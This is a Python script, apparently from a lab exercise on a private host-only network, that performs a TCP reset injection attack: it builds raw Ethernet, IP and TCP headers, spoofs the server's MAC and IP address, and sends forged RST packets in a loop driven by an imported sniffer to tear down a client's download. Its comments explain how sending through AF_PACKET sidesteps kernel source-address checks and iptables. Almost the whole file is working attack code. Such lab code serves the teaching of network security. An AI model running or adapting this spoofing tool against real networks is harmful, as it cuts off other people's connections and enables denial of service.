#!/usr/bin/env python3
"""
rst.py
Forges and sends a TCP RST to kill the server->client stream.
Must be run as root: sudo python3 rst.py
"""

import socket
import struct


# Configuration — must match sniffer.py
SERVER_IP   = "192.168.56.10"
CLIENT_IP   = "192.168.56.11"
SERVER_PORT = 8000


def checksum(data):
    """
    Standard one's complement checksum used by both IP and TCP.
    Pads to even length, sums 16-bit words, folds carries, inverts.
    """
    if len(data) % 2 != 0:
        data += b'\x00'   # pad to even length

    s = 0
    # Sum every 16-bit (2-byte) word
    for i in range(0, len(data), 2):
        word = (data[i] << 8) + data[i + 1]
        s += word

    # Fold the carry bits back into the lower 16 bits
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)

    # One's complement (invert all bits, keep 16 bits)
    return ~s & 0xFFFF


def build_ip_header(src_ip, dst_ip, total_length):
    """
    Build a 20-byte IPv4 header (no options).
    We set checksum to 0 first, compute it, then rebuild with real value.
    """
    version_ihl = (4 << 4) | 5   # version=4, IHL=5 (5x4=20 bytes)
    dscp        = 0
    ttl         = 64
    protocol    = 6               # TCP
    ip_id       = 0
    flags_frag  = 0
    checksum_placeholder = 0

    src  = socket.inet_aton(src_ip)
    dst  = socket.inet_aton(dst_ip)

    # Pack header with zero checksum first
    header = struct.pack("!BBHHHBBH4s4s",
        version_ihl,
        dscp,
        total_length,
        ip_id,
        flags_frag,
        ttl,
        protocol,
        checksum_placeholder,
        src,
        dst
    )

    # Compute real checksum over the header bytes
    ip_checksum = checksum(header)

    # Rebuild header with real checksum in the right field
    header = struct.pack("!BBHHHBBH4s4s",
        version_ihl,
        dscp,
        total_length,
        ip_id,
        flags_frag,
        ttl,
        protocol,
        ip_checksum,
        src,
        dst
    )
    return header


def build_tcp_header(src_port, dst_port, seq, src_ip, dst_ip):
    """
    Build a 20-byte TCP header with RST flag set.
    The checksum is computed over a 12-byte pseudo-header + the TCP header.
    """
    ack_num     = 0       # not needed when only RST flag is set
    data_offset = 5       # 5 x 4 = 20 bytes, no options
    # Flags byte: RST = bit 2 = 0x04
    # We set only RST, everything else (SYN, ACK, FIN, PSH) = 0
    flags       = 0x04
    window      = 0       # doesn't matter for RST
    urgent      = 0
    checksum_placeholder = 0

    # Pack with zero checksum first
    tcp = struct.pack("!HHIIBBHHH",
        src_port,
        dst_port,
        seq,
        ack_num,
        (data_offset << 4),   # upper 4 bits = data offset
        flags,
        window,
        checksum_placeholder,
        urgent
    )

    # TCP checksum is computed over a PSEUDO-HEADER + the TCP header.
    # The pseudo-header includes IP-layer info:
    #   src IP (4 bytes) + dst IP (4 bytes) + zero byte (1) +
    #   protocol (1 byte, =6) + TCP segment length (2 bytes)
    # This ties the TCP checksum to the IP addresses, so a packet
    # delivered to the wrong host gets rejected.
    tcp_length = len(tcp)   # 20 bytes (no payload)
    pseudo_header = struct.pack("!4s4sBBH",
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
        0,            # zero byte
        6,            # protocol = TCP
        tcp_length
    )

    tcp_checksum = checksum(pseudo_header + tcp)

    # Rebuild TCP header with real checksum
    tcp = struct.pack("!HHIIBBHHH",
        src_port,
        dst_port,
        seq,
        ack_num,
        (data_offset << 4),
        flags,
        window,
        tcp_checksum,
        urgent
    )
    return tcp


IFACE = "enp0s8"   # add this near the top with the other config

def send_rst(next_seq, client_port, server_mac, client_mac):
    """
    Send a forged RST using AF_PACKET (Ethernet level).
    This bypasses the kernel's IP spoofing restrictions entirely
    because we hand the complete frame directly to the network driver.
    """
    total_length = 40  # 20 byte IP + 20 byte TCP, no payload

    # Build IP and TCP headers (same functions as before)
    ip  = build_ip_header(SERVER_IP, CLIENT_IP, total_length)
    tcp = build_tcp_header(SERVER_PORT, client_port, next_seq,
                           SERVER_IP, CLIENT_IP)

    # Build Ethernet header:
    # dst MAC = client's real MAC (who we're sending to)
    # src MAC = server's MAC     (who we're pretending to be)
    # EtherType = 0x0800 (IPv4)
    eth = struct.pack("!6s6sH",
        client_mac,   # destination
        server_mac,   # source (spoofed as server)
        0x0800        # IPv4
    )

    frame = eth + ip + tcp

    # AF_PACKET sends a raw Ethernet frame directly —
    # no IP routing, no source-address checks, no iptables OUTPUT chain
    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                         socket.ntohs(0x0800))
    sock.bind((IFACE, 0))
    sock.send(frame)
    sock.close()

    print(f"[+] RST sent via AF_PACKET!")
    print(f"    spoofed src: {SERVER_IP}:{SERVER_PORT}")
    print(f"    target:      {CLIENT_IP}:{client_port}")
    print(f"    seq:         {next_seq}")


# Import sniff_once from the sniffer
from sniffer import sniff_loop

def attack_loop():
    rst_count = 0

    def on_packet(seq, next_seq, client_port, server_mac, client_mac):
        nonlocal rst_count
        rst_count += 1
        print(f"[*] Packet #{rst_count}: next_seq={next_seq}  port={client_port}")
        send_rst(next_seq, client_port, server_mac, client_mac)

    sniff_loop(on_packet)

if __name__ == "__main__":
    print("[*] Starting attack loop ...")
    print("[*] Start the client download now if not already running.")
    attack_loop()